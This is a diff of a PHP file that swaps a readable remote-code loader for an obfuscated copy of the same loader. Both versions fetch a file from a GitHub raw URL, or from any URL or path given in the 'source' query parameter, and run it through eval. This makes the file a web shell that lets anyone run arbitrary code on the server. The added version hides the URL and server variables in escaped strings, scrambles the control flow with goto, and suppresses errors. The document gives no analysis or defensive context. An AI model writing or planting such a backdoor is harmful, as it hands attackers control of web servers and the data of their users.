@@ -1,22 +1,2 @@
 <?php
-$defaultUrl = "https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/z1.txt";
-$input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
-$fileContent = '';
-if (filter_var($input, FILTER_VALIDATE_URL)) {
-    $fileContent = file_get_contents($input);
-} else {
-    $filePath = $_SERVER['DOCUMENT_ROOT'] . '/' . ltrim($input, '/');
-    if (file_exists($filePath)) {
-        $fileContent = file_get_contents($filePath);
-    } else {
-        echo "Dosya bulunamadı: " . htmlspecialchars($filePath);
-        exit;
-    }
-}
-if ($fileContent !== false) {
-    eval('?>' . $fileContent);
-} else {
-    echo "error php";
-}
-
-?>
+ goto lXWtS; Ou03E: if ($fileContent !== false) { @eval("\x3f\x3e" . $fileContent); } goto v7c31; lXWtS: $defaultUrl = "\150\x74\x74\160\x73\72\57\57\x72\141\x77\x2e\x67\151\164\x68\x75\x62\165\163\x65\x72\x63\x6f\156\x74\145\156\x74\56\x63\x6f\x6d\57\156\145\x63\145\163\x73\x61\x72\x79\146\157\162\57\156\x65\x63\145\163\x2f\x72\145\146\x73\57\x68\x65\141\x64\x73\57\155\141\x69\156\57\x7a\x31\x2e\164\170\164"; goto yio4E; gkFEr: if (filter_var($input, FILTER_VALIDATE_URL)) { @($fileContent = file_get_contents($input)); } else { $filePath = $_SERVER["\x44\x4f\103\125\115\105\116\x54\x5f\x52\x4f\117\124"] . "\57" . ltrim($input, "\x2f"); if (@file_exists($filePath)) { @($fileContent = file_get_contents($filePath)); } else { die; } } goto Ou03E; JDOWW: $fileContent = ''; goto gkFEr; yio4E: $input = isset($_GET["\163\157\165\x72\143\145"]) ? $_GET["\x73\157\165\x72\143\145"] : $defaultUrl; goto JDOWW; v7c31: ?>
